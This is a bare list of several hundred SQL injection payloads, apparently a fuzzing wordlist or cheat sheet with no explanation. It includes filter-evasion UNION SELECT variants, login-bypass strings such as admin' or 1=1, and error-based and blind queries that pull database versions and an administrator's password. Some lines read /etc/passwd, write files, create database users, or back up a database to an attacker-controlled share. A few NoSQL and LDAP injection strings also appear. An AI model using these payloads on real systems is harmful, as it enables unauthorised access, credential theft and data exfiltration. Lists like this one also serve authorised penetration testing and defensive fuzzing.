+1'+union+distinctROW+select+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
+' #?uNiOn + #?sEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- - 
+' + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1' /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+' +un/**/ion+se/**/lect 1,2,3,4,5,6,7,8,9,10,12,13,14-- - 
+' +?UnI?On?+'SeL?ECT? 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1'(UnIoN)+(SelECT)+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
+1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1' 0%a0union%a0select%09 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+' %0Aunion%0Aselect%0A 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+' uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+1' /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+1' +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- - 
+1& n=19901' Union Select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14-- -
+1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -
+and extractvalue(0x0a,concat(0x0a,(select version())))-- -
+and updatexml(null,concat(0x0a,(select version())),null)-- -
+-1 Union Select 0x3127,2,3,4 0x3127 = 1' 
+-1 Union Select 1,0x3227,3,4 0x3227 = 2'
+-1 Union Select 1,2,0x3327,4 0x3327 = 3'
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/  
+%55nion(%53elect 1,2,3)  
+union+distinctROW+select+1,2,3,4-- -  
+#?uNiOn + #?sEleCt  
+#?1q %0AuNiOn all#qa%0A#%0AsEleCt  
+/*!%55NiOn*/ /*!%53eLEct*/  
++un/**/ion+se/**/lect  
++?UnI?On?+'SeL?ECT?  
+(UnIoN)+(SelECT)+1,2,3,4-- -  
++UnIoN/*&a=*/SeLeCT/*&a=*/  
+%55nion(%53elect 1,2,3,4)-- -  
+/**//*!12345UNION SELECT*//**/  
+/**//*!50000UNION SELECT*//**/  
+/**/UNION/**//*!50000SELECT*//**/  
+/*!50000UniON SeLeCt*/  
+union /*!50000%53elect*/  
+/*!u%6eion*/ /*!se%6cect*/  
+/*--*/union/*--*/select/*--*/  
+union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
+/*!union*/+/*!select*/  
+/**/uNIon/**/sEleCt/**/  
+and 0e0union distinctROW select 1,2,3,4  
+and .0unIon distincrOw /*!50000sElect*/ 1,2,3,4  
+AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4  
+and mod(9,9) UNION SELECT 1,2,3,4  
+'-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4  
+.0union distinct/**_**/Select 1,2,3,4  
+union distinct selec%54 1,2,3,4  
+-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4
+1' Union Select null, null, null, null, null, null, null from dual-- -
+1+UNION+ALL+SELECT+null,null,null,null
+1 Union Select null,null,null,null desc
+1 AND 0 Union Select null,null,null,null
+1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null  
+1 %55nion(%53elect 1,2,3) null,null,null,null  
+1+union+distinctROW+select+null,null,null,null--+-  
+1+ #?uNiOn + #?sEleCt null,null,null,null  
+1+(UnIoN)+(SelECT)+null,null,null,null--+-  
+1 %55nion(%53elect null,null,null,null)
+1 /*!50000UniON SeLeCt*/ null,null,null,null  
+1 and union select null,cast(current_database() ||":"|| current_user ||":"|| version() as int),null,null
+1 and 1=cast(current_database() as int)
++#1q%0Aunion all#qa%0A#%0Aselect
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+1+union+all+select+1,2,3,4,5,6,7,8,9,10,11-
+-1' union+distinct+select+1+--+
+-1' union+select+1+--+
+1' Union Select 1-- -:1' Union Select 1-- -
+-1' UNION SELECT 1,2,3--+
+1+union+select+1,2,3,4,5,6,7,8,9,10,EVENT_CATALOG+from+information_schema.EVENTS
+-1+union+select+1,2,3,4,5,6,7,8,9,10,@@version
+1'union select 1,2,database(),3,4,5,6,7,8,9,10,11 — +-
+-1 union select 1, HERE, 1--+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1+UNION+SELECT+26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,token,8,7,6,5,4,3,2,1+from+user+where+userid=1--
+=1 UNION SELECT * FROM User
+1' union select user(),schema(),4,5,6,7,%25278
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'--'%20%2F%20%22--%22%20
+-%20%60%27%20or%201%3D1%23%60
+-%20%60%27%20or%201%3D1/%2A%60
+-%20%60%27%20or%201%3D1--%60
+-%20%60%27%29%20or%20%271%27%3D%271--%60
+-%20%60%27%29%20or%20%28%271%27%3D%271--%60
+-%20%60admin'%20%23%60
+-%20%60admin'%20--%60
+-%20%60admin'%2F*%60
+%20or%20''='
+'%20or%20''='
+%20or%201=1
+'%20or%201=1
+--%20or%20%23
+'%20or%20''%26'
+%20or%20'x'='x
+%20or%20x=x
+'%20or%20'x'='x
+')%20or%20('x'='x
+)%20or%20('x'='x
+%21
+21 %
+%22
+%27
+%22%20--
+%27%20--
+%22%20%22
+%27%27%27
+%22%20%23
+%27%27%27
+%22%20or%200%3D0%20--
+%27%20or%200%3D0%20--
+%22%20or%200%3D0%20%23
+%27%20or%200%3D0%20%23
+%22%20or%200%3D0%20%E2%80%93
+%27%20or%200%3D0%20%E2%80%93
+%22%20or%201--
+%27%20or%201--
+%22%20OR%201%20%3D%201%20--%20-
+%27%20OR%201%20%3D%201%20--%20-
+%22%20or%201%3D1
+%27%20or%201%3D1
+%22%20or%201%3D1--
+%27%20or%201%3D1--
+%22%20or%201%3D1%20--
+%27%20or%201%3D1%20--
+%22%20or%201%3D1%20%E2%80%93
+%27%20or%201%3D1%20%E2%80%93
+%22%20or%201%3D1%23
+%27%20or%201%3D1%23
+%22%20or%201%3D1/%2A
+%27%20or%201%3D1/%2A
+%22%20or%201%3D1%E2%80%93
+%27%20or%201%3D1%E2%80%93
+%22%20or%20%221%22%3D%221
+%27%20or%20%221%27%3D%221
+%22%20or%20%221%22%3D%221%22--
+%27%20or%20%221%27%3D%221%27--
+%22%20or%20%221%22%3D%221%22%23
+%27%20or%20%221%27%3D%221%22%23
+%22%20or%20%221%22%3D%221%22/%2A
+%22%20or%20%221%22%3D%221%22%2F*
+%22%20or%20%22%22%20%22
+%22%20or%20%22%22-%22
+%22%20or%20%22%22%26%22
+%22%20or%20%22%22%2A%22
+%22%20or%20%22%22%3D%22
+%22%20or%20%22%22%5E%22
+%22%20or%20true--
+%27%20or%20true--
+%22%22
+%27%27
+%22*%22
+%27*%27
+%22%26%22
+%27%26%27
+%22%29%20or%20%221%22%3D%221
+%22%29%20or%20%221%22%3D%221%22--
+%22%29%20or%20%221%22%3D%221%22%23
+%22%29%20or%20%221%22%3D%221%22/%2A
+%22%29%20or%20%28%221%22%3D%221
+%22%29%20or%20%28%221%22%3D%221%22--
+%22%29%20or%20%28%221%22%3D%221%22%23
+%22%29%20or%20%28%221%22%3D%221%22/%2A
+%22%29%20or%20true--
+%22%2F*
+'%22-*%2F'%22%22'
+'%27-*%2F'%27%27'
+%22%5E%22
+%22or%201%3D1%20or%20%22%22%3D%22
+%23
+'%23
++%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
+23 OR 1=1
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+'--'%2520%252F%2520%2522--%2522%2520
+-%2520%2560admin'%2520%2523%2560
+-%2520%2560admin'%2520--%2560
+-%2520%2560admin'%252F*%2560
+'%2520or%2520''%2526'
+%2522
+%2522%2520--
+%2522%2520%2522
+%2522%2520%2523
+%2522%2520or%2520%25221%2522%253D%25221%2522%252F*
+%2522%2522
+%2522*%2522
+%2522-%2522
+%2522%2526%2522
+%2522%252F*
+'%2522-*%252F'%2522%2522'
+%2522%255E%2522
+'%2523
+'--'%252520%25252F%252520%252522--%252522%252520
+-%252520%252560admin'%252520%252523%252560
+-%252520%252560admin'%252520--%252560
+-%252520%252560admin'%25252F*%252560
+%252522
+%252522%252520--
+%252522%252520%252522
+%252522%252520%252523
+%252522%252522
+%252522*%252522
+%252522-%252522
+%252522%252526%252522
+%252522%25252F*
+%'252522-*%25252F'%252522%252522'
+%'252522-*%25252F'%252522%252522'%
+'%252522-*%25252F'%252522%252522'
+%252522%25255E%252522
+'%252523
+'%25252C1%25252C1)%25252C(1%25252C2%25252C3%25252C4%25252C5)--%252520-
+'%25252C1%25252C1)%25252C(1%25252C2%25252C3%25252C4%25252C(select%2525201%252520union%252520select%252520case%252520when(substr(version()%25252C1%25252C1)%25253D5)%252520then%2525201%252520else%2525202%252520end))--%252520-
+%2527
+%25%27%20or%20%270%27%3D%270
+%2527 union select user(),schema(),4,5,6,7,%25278
+'%2527 union select user(),schema(),4,5,6,7,%25278
+'%252C1%252C1)%252C(1%252C2%252C3%252C4%252C5)--%2520-
+'%252C1%252C1)%252C(1%252C2%252C3%252C4%252C(select%25201%2520union%2520select%2520case%2520when(substr(version()%252C1%252C1)%253D5)%2520then%25201%2520else%25202%2520end))--%2520-
+%252F*!12345%252555nion*%252F%2520%252F*!12345%252553elect*%252F%25201%252C2%252C3%252C4%252C5%252C6%252C7
+%252f%252a*/union%252f%252a /select%252f%252a*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%252F**%252For%252F**%252F1%252F**%252F%253D%252F**%252F1
+%26
+26 %
+%27
+%27%20and%201%3D%271
+%27%20or%200%3D0%20--
+%27%20or%200%3D0%20%23
+%27%20or%200%3D0%20%E2%80%93
+%27%20or%201--
+%27%20or%201=1
+%27%20OR%201%20--%20-
+%27%20or%201%20--%27
+%27%20or%201%3D1
+%27%20or%201%3D1--
+%27%20or%201%3D1%20--
+%27%20or%201%3D1%20%E2%80%93
+%27%20or%201%3D1%20LIMIT%201%3B%23
+%27%20or%201%3D1%20or%20%27%27%3D%27
+%27%20or%201%3D1%23
+%27%20or%201%3D1/%2A
+%27%20or%201%3D1%3B%23
+%27%20or%201%3D1%E2%80%93
+%27%20or%20%20%20%20%20%20%20%20%200%3D0%20%23
+%27%20or%20%22
+%27%20OR%20%271
+%27%20or%20%271%27%3D%271
+%27%20or%20%271%27%3D%271%27--
+%27%20or%20%271%27%3D%271%27%23
+%27%20or%20%271%27%3D%271%27/%2A
+%27%20or%20%271%E2%80%B2%3D%271
+%27%20or%20%27%27%20%27
+%27%20OR%20%27%27%20%3D%20%27
+%27%20or%20%27%27%26%27
+%27%20or%20%27%27-%27
+%27%20or%20%27%27%2A%27
+%27%20or%20%27%27%3D%27
+%27%20or%20%27%27%5E%27
+%27%20or%20true--
+%27%20or%20uid%20like%20%27%25
+%27%20or%20uname%20like%20%27%25
+%27%20union%20%28select%20NULL%2C%20%28select%20%40%40version%29%29%20--
+%27%27%20or%20%27%27%3D%27
+%27%27%20or%20true--%27
+%27%29%20or%201--
+%27%29%20or%20%271%27%3D%271
+%27%29%20or%20%271%27%3D%271--
+%27%29%20or%20%271%27%3D%271%27--
+%27%29%20or%20%271%27%3D%271%27%23
+%27%29%20or%20%271%27%3D%271%27/%2A
+%27%29%20or%20%28%271%27%3D%271
+%27%29%20or%20%28%271%27%3D%271--
+%27%29%20or%20%28%271%27%3D%271%27--
+%27%29%20or%20%28%271%27%3D%271%27%23
+%27%29%20or%20%28%271%27%3D%271%27/%2A
+%27%29%20or%20%28%27%27%29%3D%28%27
+%27%29%20or%20true--
+%27%29%29%20or%20%28%28%27%27%29%29%3D%28%28%27
+%27+or+1%3D1--
+%27+or+1%3D1%2F%2A
+%27+or+1%3D1%3B--
+%27+or+1%3D1%3B%2500
+%27+or+1%3D1+or+%27%27%3D
+%27or%201%3D1%20or%20%27%27%3D%27
+%27+or+%271%27%3D%271--
+%27+or+%271%27%3D%271%2F%2A
+%27+or+%271%27%3D%271%3B--
+%27or%271%3D1
+%27or%271%3D1%27
+%27or%271%3D1%27/
+%27or%271%3D1%E2%80%B2
+%27+or+%27x%27%3D%27x
+%27+union+select+1%2C2%2C3--
+%27+union+select+banner%2Cnull+from+v%24version--
+%27+union+select+null%2Cnull%2Cnull--
+%27+union+select+password%2Cnull+from+users+where+username%3D%27administrator%27--
+%27+union+select+username%7C%7Cpassword+from+users--
+%27+union+select+@@version%2Cnull%23
+%28
+28 %
+%29
+29 %
+%29%20or%20%271%27%3D%271--
+%29%20or%20%271%E2%80%B2%3D%271%E2%80%93
+%29%20or%20%28%271%27%3D%271--
+%29%20or%20%28%271%E2%80%B2%3D%271%E2%80%93
+%29%29+or+%221%22%3D%221--
+%29+or+%271%27%3D%271--
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+/%2A%2A/or/%2A%2A/1/%2A%2A/%3D/%2A%2A/1
+/%2A%2A/union/%2A%2A/select/%2A%2A/
+%2A%7C
+%2B/%2A%E2%9C%93%2A/UnIoN/%2A%E2%9C%93%2A/%2B/%2A%E2%9C%93%2A/AlL/%2A%E2%9C%93%2A/%2B%28SeLeCt%2B1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6.....%29%2B--%2B
+%2B%2F*!12120%2555%256e%2549%256f%254e*%2F%2B(%2553%2565%254c%2565%2543%2574%2B111%2C222%2C333%2Cdatabase()%2C555%2C...)%2B--%2B
+'%2bconvert(char,(SELECT IIF(SUBSTRING((***query_here***),1,1)='d',3,@@VERSION)))%2b
+'%2C1%2C1)%2C(1%2C2%2C3%2C4%2C5)--%20-
+'%2C1%2C1)%2C(1%2C2%2C3%2C4%2C(select%201%20union%20select%20case%20when(substr(version()%2C1%2C1)%3D5)%20then%201%20else%202%20end))--%20-
+%2F*!12345%2555nion*%2F%20%2F*!12345%2553elect*%2F%201%2C2%2C3%2C4%2C5%2C6%2C7
+%2F**%2For%2F**%2F1%2F**%2F%3D%2F**%2F1
+%2f**%2funion%2f**%2fselect
+%2f**%2funion%2f**%2fselect%2f**%2f
++%2F**/+Union/*!select*/
+2+order+by+1--+
+2+order+by+12--+
+3.10E+17
+3 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,database(),3,4,5 -
+%3B
+%3B%20or%20%271%27%3D%271%27
++/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4 --
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--
+/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)
+/*!50000cOnCat*/(/*!*/)
+/*!50000Gr%6fuP_c%6fnCAT*/()
+/*!50000gRouP_cOnCaT*/()
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))
+/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
+/*!50000UniON SeLeCt*/
+/**//*!50000UNION SELECT*//**/
+’ /*!50000union*/ select 1,2,3,4,5,6,7,8,9-- -
+' +/*!50000UNION+SELECT+ALL*/+ 1,2,3,4,5,6,7,8,9 — -
+/*!50732someInvalidSQLSyntax*/
+%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)
+%55nion/**/%53elect
+/*!%55NiOn*/ /*!%53eLEct*/
+%55nion(%53elect 1,2,3)-- -
+%5c
+(||6)
+||'6
+||6
+%75nion/**)!*/sele%63%74/**)!*/+1,2,3....
+%7C
+/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
+9999999999+union+select+1,2,3,4,concat(password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+users+where+id=".$userid."--");
+999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users
+a'
+Ã½ or 1=1 --
+a’ AND ‘omar’=’not-omar
+a’ AND ORD(MID(VERSION(),1,1))>96 AND ‘omar’=’omar
+-abc)/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/'a'/**/--
++        addition, concatenate (or space in url)
+- `admin' #`
+- `admin' --`
+- `admin'/*`
+admin" #
+admin" --
+admin"/
+admin"/*
+admin' #
+admin' --
+admin'/
+admin'/*
+admin'%20--
+admin')%20or%20('1'%3D'1'%2F*
+admin%22%20--
+admin%22%20or%201%3D1
+admin%22%20or%201%3D1--
+admin%22%20or%201%3D1/
+admin%22%20or%201%3D1%23
+admin%22%20or%201%3D1/%2A
+admin%22%20or%20%221%22%3D%221
+admin%22%20or%20%221%22%3D%221%22--
+admin%22%20or%20%221%22%3D%221%22/
+admin%22%20or%20%221%22%3D%221%22%23
+admin%22%20or%20%221%22%3D%221%22/%2A
+admin%22%20or%20%221%22%3D%221%22%2F*
+admin%22%29%20or%20%221%22%3D%221
+admin%22%29%20or%20%221%22%3D%221%22--
+admin%22%29%20or%20%221%22%3D%221%22%23
+admin%22%29%20or%20%221%22%3D%221%22/%2A
+admin%22%29%20or%20%28%221%22%3D%221
+admin%22%29%20or%20%28%221%22%3D%221%22--
+admin%22%29%20or%20%28%221%22%3D%221%22/
+admin%22%29%20or%20%28%221%22%3D%221%22%23
+admin%22%29%20or%20%28%221%22%3D%221%22/%2A
+admin%22or%201%3D1%20or%20%22%22%3D%22
+admin'%2520--
+admin')%2520or%2520('1'%253D'1'%252F*
+admin%2522%2520--
+admin%2522%2520or%2520%25221%2522%253D%25221
+admin%2522%2520or%2520%25221%2522%253D%25221%2522--
+admin%2522%2520or%2520%25221%2522%253D%25221%2522%2523
+admin%2522%2520or%2520%25221%2522%253D%25221%2522%252F*
+admin%252522%252520--
+admin')%25252525252525252520or%25252525252525252520'1'%2525252525252525253D'1'%2525252525252525252F*'
+admin%27%20or%201%3D1
+admin%27%20or%201%3D1--
+admin%27%20or%201%3D1/
+admin%27%20or%201%3D1%23
+admin%27%20or%201%3D1/%2A
+admin%27%20or%20%27
+admin%27%20or%20%271%27%3D%271
+admin%27%20or%20%271%27%3D%271%27--
+admin%27%20or%20%271%27%3D%271%27/
+admin%27%20or%20%271%27%3D%271%27%23
+admin%27%20or%20%271%27%3D%271%27/%2A
+admin%27%29%20or%20%271%27%3D%271
+admin%27%29%20or%20%271%27%3D%271%27--
+admin%27%29%20or%20%271%27%3D%271%27/
+admin%27%29%20or%20%271%27%3D%271%27%23
+admin%27%29%20or%20%271%27%3D%271%27/%2A
+admin%27%29%20or%20%28%271%27%3D%271
+admin%27%29%20or%20%28%271%27%3D%271%27--
+admin%27%29%20or%20%28%271%27%3D%271%27/
+admin%27%29%20or%20%28%271%27%3D%271%27%23
+admin%27%29%20or%20%28%271%27%3D%271%27/%2A
+admin%27or%201%3D1%20or%20%27%27%3D%27
+admin%27SELECT%2B1%2C%40%40VERSION%2C3--
+admin' and substring(password/text(),1,1)='7
+admin%E2%80%99%20or%201%27%3D%E2%80%991-%20-
+admin%E2%80%99%20OR%201%3D1-%20-%E2%80%98
+administrator'--
+administrator%2525E2%252580%252599%252520or%2525201%25253D1%252520--%25252B
+administrator%25E2%2580%2599%2520or%25201%253D1%2520--%252B
+administrator%E2%80%99%20or%201%3D1%20--%2B
+administrator’ or 1=1 --+
+admin' or '
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/
+admin") or ("1"="1"/*
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/
+admin') or ('1'='1'/*
+admin’ or 1'=’1- -
+admin’ OR 1=1- -‘
+admin"or 1=1 or ""="
+admin'or 1=1 or ''='
+admin'SELECT+1,@@VERSION,3--
+admin'SELECT%252B1%252C%2540%2540VERSION%252C3--
+admin'SELECT%2B1%2C%40%40VERSION%2C3--
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 1='1
+' and 1=1--
+and 1=1
+and 1=1--
+AND 1=1
+AND 1=1#
+AND 1=1-- 
+' AND '1'='1
+AND 1=1
+AND 1=1#
+AND 1=1-- 
+AND 1=1 AND '%'='
+AND 1=1 AND '%'='
+' and 1=2--
+' AND '1'='2
+‘ and 1=2 union all select ‘blablabla_bug_bounty_program’ into outfile ‘/tmp/blablabla’ —
+‘ and 1=2 union all select concat_ws(0x3a,version(),user(),database())
+‘ and 1=2 union all select load_file(‘/etc/passwd’)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+and 1 in (select var from temp)--
+and%201%3D1
+and%201%3D1--
+AND%201%3D1
+AND%201%3D1--
+AND%201%3D1%23
+and%201%3D1%E2%80%93
+AND 7300=7300 AND ('pKlZ'='pKlY
+AND 7300=7300 AND 'pKlZ'='pKlY
+AND 7300=7300 AND ('pKlZ'='pKlY
+AND 7300=7300 AND 'pKlZ'='pKlZ
+AND 7300=7300 AND ('pKlZ'='pKlZ
+AND 7300=7300 AND 'pKlZ'='pKlZ
+AND 7300=7300 AND ('pKlZ'='pKlZ
+AND 7506=9091 AND ('5913=5913
+AND 7506=9091 AND (5913=5913
+AND 7506=9091 AND ('5913=5913
+AND 7506=9091 AND (5913=5913
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+AND 8310=8311 AND '%'=' and (select substring(@@version,1,1))='X' and (select substring(@@version,1,1))='M' and (select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select 
+' and 'a'='a--
+' and a='a
+' and exists(select 1 from dual)--
+' and exists(select 1 from not-a-real-table)--
+' and exists(select 1 from users where rownum=1)--
+' and exists(select 1 from users where username='administrator')--
+' and exists(select 1 from users where username='administrator' and length(password)>1)--
+' and exists(select 1 from users where username='administrator' and length(password)>2)--
+' and exists(select * from users where username='administrator' and length(password)>10)--
+' and exists(select * from users where username='administrator' and password like '%a%')--
+' and exists(select * from users where username='administrator' and password like '%a')--
+' and exists(select * from users where username='administrator' and password like 'a%')--
+' and exists(select * from users where username='administrator' and password regexp '^[a-z]{5}$')--
+' and exists(select * from users where username='administrator' and substr(password,1,1)='a')--
++and extractvalue(0x0a,concat(0x0a,(select concat(columna) from tabla limit 0,1)))
++and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))
++and extractvalue(0x0a,concat(0x0a,(select version())))
+AND false
+' AND id IS NULL; --
+' AND MID(VERSION(),1,1) = '5';
+AND mod(29,9)+div+@a:=(concat(database(),"--","_Y000!_"))+UNION+DISTINCTROW+SELECT+1,2,3,@a,5,6,7
+' and 'one'='one
+' and 'one'='one--
+' and 'one'='one–
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x636f6c756d6e61+AND+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(columna+AS+CHAR),0x7e))+FROM+table+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x7461626c65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
++and+(SELECT+1+from+user+limit+0,1
+'and(select(1)union(select(case/**/when(1)=1/**/then/**/1/**/else/**/2/**/end)))--
+'and(select(1)union(select(case/**/when(1)=1/**/then/**/1/**/else/**/2/**/end)))and'
+'and(select(1)union(select(case/**/when((select/**/ascii(substr(column_name/**/from/**/1/**/for/**/1))/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'xxxxxxxxxxxxxxx'/**/limit/**/1/**/offset/**/0))=97/**/then(1)else(2)end)))and
++and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+and (select substring(@@version,1,1))='M'
+and (select substring(@@version,1,1))='M'
+and (select substring(@@version,1,1))='X'
+and (select substring(@@version,1,1))='X'
+and (select substring(@@version,2,1))='i'
+and (select substring(@@version,2,1))='i'
+and (select substring(@@version,2,1))='y'
+and (select substring(@@version,2,1))='y'
+and (select substring(@@version,3,1))='c'
+and (select substring(@@version,3,1))='c'
+and (select substring(@@version,3,1))='S'
+and (select substring(@@version,3,1))='S'
+and (select substring(@@version,3,1))='X'
+and (select substring(@@version,3,1))='X'
+' and substring(password/text(),1,1)='7
+' and substr(password,1,1)='a' and username='administrator'--
+' and substr(password,1,1)='a' and username='xyz'--
++and updatexml(null,concat(0x0a,(select concat(columna) from tabla limit 0,1)),null)
++and updatexml(null,concat(0x0a,(select database())),null)
++and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)
+' and updatexml(null,concat(0x0a,version()),null)-- -@\hackerone\.mil
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+â or 1=1 --
+"a"" or 3=3--"
+a' or 3=3--
+â or 3=3 --
+a' or 'a' = 'a
+a’ ORDER BY 2 — V
+AS INJECTX WHERE 1=1 AND 1=0
+AS INJECTX WHERE 1=1 AND 1=0#
+AS INJECTX WHERE 1=1 AND 1=0--
+AS INJECTX WHERE 1=1 AND 1=0
+AS INJECTX WHERE 1=1 AND 1=0#
+AS INJECTX WHERE 1=1 AND 1=0--
+AS INJECTX WHERE 1=1 AND 1=1
+AS INJECTX WHERE 1=1 AND 1=1#
+AS INJECTX WHERE 1=1 AND 1=1--
+AS INJECTX WHERE 1=1 AND 1=1
+AS INJECTX WHERE 1=1 AND 1=1#
+AS INJECTX WHERE 1=1 AND 1=1--
+a’ UNION SELECT VERSION() --
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+`cana'||(select/**/'r'/**/where/**/1=1)||'y.bluebird`
+?cat=1+order+by+11+--
+char%4039%41%2b%40SELECT CoNcAt()
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+'dal'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
